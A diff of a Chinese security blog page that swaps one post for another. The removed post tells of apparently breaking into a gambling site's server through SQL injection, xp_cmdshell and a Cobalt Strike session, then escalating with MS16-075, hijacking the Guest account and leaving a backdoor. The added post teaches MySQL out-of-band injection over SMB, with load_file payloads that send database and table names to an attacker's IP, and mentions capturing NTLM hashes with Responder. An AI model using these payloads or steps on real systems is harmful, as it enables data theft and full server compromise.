@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>从sql注入到日下整个服务器 | 九世的博客</title>
-  <meta name="keywords" content=" 渗透 ">
-  <meta name="description" content="从sql注入到日下整个服务器 | 九世的博客">
+  <title>mysql smb外带注入 | 九世的博客</title>
+  <meta name="keywords" content=" Writing ">
+  <meta name="description" content="mysql smb外带注入 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1789,9 +1789,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-从sql注入到日下整个服务器" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-mysql-smb外带注入" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">从sql注入到日下整个服务器</h1>
+        <h1 class="article-title">mysql smb外带注入</h1>
     
     <div class="article-meta">
         
@@ -1800,14 +1800,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">渗透</a>
+            <a href="javascript:" class="color3">Writing</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-08-07 02:50:19">2019-08-07 02:10</time>
+        创建时间:<time class="date" title="更新时间: 2021-06-29 22:27:51">2021-06-29 22:19</time>
         
     </div>
     <div class="article-meta">
@@ -1829,7 +1829,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过程"><span class="toc-text">过程</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -1844,41 +1844,39 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在Zoomeye瞎几把搜后台，看看能不能碰到几个弱口令 ，扔到CNVD提交<br><img src="https://s2.ax1x.com/2019/08/07/e40Jm9.png" alt="e40Jm9.png"></p>
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>打开IP一看，我草 棋牌登录<br><img src="https://s2.ax1x.com/2019/08/07/e40YwR.md.png" alt="e40YwR.md.png"></p>
-<p>随便输入什么admin admin之类的，发现密码 不对<br><img src="https://s2.ax1x.com/2019/08/07/e40tT1.md.png" alt="e40tT1.md.png"></p>
-<p>输入admin‘，发现没有回显错误<br><img src="https://s2.ax1x.com/2019/08/07/e40dfK.md.png" alt="e40dfK.md.png"></p>
-<p>输入个万能密码发现又返回了错误<br><img src="https://s2.ax1x.com/2019/08/07/e40BlD.md.png" alt="e40BlD.md.png"></p>
-<p>burp抓包扔sqlmap跑了一波，然后发现存在注入，盲注，mssql<br><img src="https://s2.ax1x.com/2019/08/07/e40ymd.md.png" alt="e40ymd.md.png"></p>
-<p>确认是windows server 2008的系统</p>
-<p>查询一下是不是dba权限，发现是<br><img src="https://s2.ax1x.com/2019/08/07/e402kt.md.png" alt="e402kt.md.png"></p>
-<p>那么当前用户肯定是sa用户了<br><img src="https://s2.ax1x.com/2019/08/07/e4041S.png" alt="e4041S.png"></p>
-<p>查询一下密码，发现回显出的更本不是密码…而是数据库的用户<br><img src="https://s2.ax1x.com/2019/08/07/e4070s.png" alt="e4070s.png"></p>
-<p>查询当前数据库，然后跑出了管理员密码<br><img src="https://s2.ax1x.com/2019/08/07/e40jpT.png" alt="e40jpT.png"></p>
-<p><img src="https://s2.ax1x.com/2019/08/07/e40zX4.png" alt="e40zX4.png"></p>
-<p>然后md5解不出，脱airen去CMD5掏了出明文<br><img src="https://s2.ax1x.com/2019/08/07/e4BpnJ.png" alt="e4BpnJ.png"></p>
-<p>登进后台看了一下，坑人玩意啊<br><img src="https://s2.ax1x.com/2019/08/07/e4BC7R.png" alt="e4BC7R.png"></p>
-<p>然后找了一下后台功能，发现没的上传shell的地方<br><img src="https://s2.ax1x.com/2019/08/07/e4BQAI.png" alt="e4BQAI.png"></p>
-<p>寻思了一下，决定用后台密码猜一下是不是sa用户的密码，Boom!<br><img src="https://s2.ax1x.com/2019/08/07/e4BlNt.png" alt="e4BlNt.png"></p>
-<p>还真的连上了，我日，执行一波<code>exec master.dbo.xp_cmdshell</code>,发现sa用户被降权了<br><img src="https://s2.ax1x.com/2019/08/07/e4BRb9.md.png" alt="e4BRb9.md.png"></p>
-<p>查询了一波进程，发现并没有杀软<br><img src="https://s2.ax1x.com/2019/08/07/e4BfER.png" alt="e4BfER.png"></p>
-<p>用户只有最初始的两个<br><img src="https://s2.ax1x.com/2019/08/07/e4B44x.png" alt="e4B44x.png"></p>
-<p>管理员组没改名<br><img src="https://s2.ax1x.com/2019/08/07/e4BIC6.md.png" alt="e4BIC6.md.png"></p>
-<p>cs生成ps，用exec master.dbo.xp_cmdshell来执行获取会话<br><img src="https://s2.ax1x.com/2019/08/07/e4Bo8K.png" alt="e4Bo8K.png"></p>
-<p>查询了一波补丁<br><img src="https://s2.ax1x.com/2019/08/07/e4BTgO.md.png" alt="e4BTgO.md.png"></p>
-<p>后面由于cs上传exp上传不成功，派会话到本机的msf，ngrok启动<br><img src="https://s2.ax1x.com/2019/08/07/e4BbKe.png" alt="e4BbKe.png"></p>
-<p><img src="https://s2.ax1x.com/2019/08/07/e4BqDH.png" alt="e4BqDH.png"></p>
-<p>cs的监听设置为ngrok的IP和端口<br><img src="https://s2.ax1x.com/2019/08/07/e4D9xS.png" alt="e4D9xS.png"></p>
-<p><img src="https://s2.ax1x.com/2019/08/07/e4DV5q.png" alt="e4DV5q.png"></p>
-<p>成功接收到会话<br><img src="https://s2.ax1x.com/2019/08/07/e4BLbd.md.png" alt="e4BLbd.md.png"></p>
-<p>使用模块查询了一波能提权利用的操作<br><img src="https://s2.ax1x.com/2019/08/07/e4DPKg.png" alt="e4DPKg.png"></p>
-<p>试了几个exp模块没成功，然后看到上次提权用的MS16-075，反手就试了一遍，然后提下来了<br><img src="https://s2.ax1x.com/2019/08/07/e4DFbj.png" alt="e4DFbj.png"></p>
-<p><img src="https://s2.ax1x.com/2019/08/07/e4DAVs.png" alt="e4DAVs.png"></p>
-<p>添加用户一系列操作<br><img src="https://s2.ax1x.com/2019/08/07/e4DeP0.png" alt="e4DeP0.png"></p>
-<p><img src="https://s2.ax1x.com/2019/08/07/e4DmGV.png" alt="e4DmGV.png"></p>
-<p>激活Guest用户用于做RID劫持<br><img src="https://s2.ax1x.com/2019/08/07/e4Dn2T.png" alt="e4Dn2T.png"></p>
-<p>最后成功获取到管理员所有数据，控制整台服务器<br><img src="https://s2.ax1x.com/2019/08/07/e4DQr4.md.png" alt="e4DQr4.md.png"></p>
-<p>留下个后门走人<br><img src="https://s2.ax1x.com/2019/08/07/e4DlqJ.png" alt="e4DlqJ.png"></p>
+        <p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p>
+<pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：
+map to guest = Bad User
+新设置一个smb
+
+smb日志:/var/log/samba
+</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p>
+<p>smb外带注入与DNS外带注入比较:</p>
+<ol>
+<li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li>
+<li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li>
+</ol>
+<p>构造sql语句：</p>
+<pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))
+
+
+为了方便从log里提取查询的内容，可以构造如下语句
+select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));
+</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p>
+<p>查询当前数据库里的表</p>
+<pre><code>1. 使用limit
+2. substring截断
+</code></pre><p>使用limit请先获取总共的表数</p>
+<pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));
+</code></pre><p>再用limit逐个查询</p>
+<pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));
+</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p>
+<p>substring截断<br>截断到120字符串即可</p>
+<pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));
+</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p>
+<p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p>
+<p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1888,12 +1886,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>从sql注入到日下整个服务器</p>
+    <p><span class="copy-title">文章标题:</span>mysql smb外带注入</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-08-07, 02:10:37</p>
-    <p><span class="copy-title">最后更新:</span>2019-08-07, 02:50:19</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/709141a4.html" title="从sql注入到日下整个服务器">http://422926799.github.io/posts/709141a4.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-06-29, 22:19:23</p>
+    <p><span class="copy-title">最后更新:</span>2021-06-29, 22:27:51</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/af61cc76.html" title="mysql smb外带注入">http://422926799.github.io/posts/af61cc76.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
